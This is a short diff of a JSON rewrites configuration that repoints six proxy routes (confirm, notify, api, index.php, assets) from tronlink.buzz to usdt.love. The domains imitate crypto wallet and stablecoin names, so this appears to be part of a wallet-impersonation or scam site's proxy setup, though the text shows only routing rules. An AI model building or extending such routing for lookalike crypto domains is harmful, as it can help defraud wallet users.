@@ -3,27 +3,27 @@
   "rewrites": [
     {
       "source": "/index/index/confirm",
-      "destination": "https://tronlink.buzz/index/index/confirm"
+      "destination": "https://www.usdt.love/index/index/confirm"
     },
     {
       "source": "/index/index/notify",
-      "destination": "https://tronlink.buzz/index/index/notify"
+      "destination": "https://www.usdt.love/index/index/notify"
     },
     {
       "source": "/api/:path*",
-      "destination": "https://tronlink.buzz/api/:path*"
+      "destination": "https://www.usdt.love/api/:path*"
     },
     {
       "source": "/index.php",
-      "destination": "https://tronlink.buzz/index.php"
+      "destination": "https://www.usdt.love/index.php"
     },
     {
       "source": "/index.php/:path*",
-      "destination": "https://tronlink.buzz/index.php/:path*"
+      "destination": "https://www.usdt.love/index.php/:path*"
     },
     {
       "source": "/assets/:path*",
-      "destination": "https://tronlink.buzz/assets/:path*"
+      "destination": "https://www.usdt.love/assets/:path*"
     }
   ]
 }
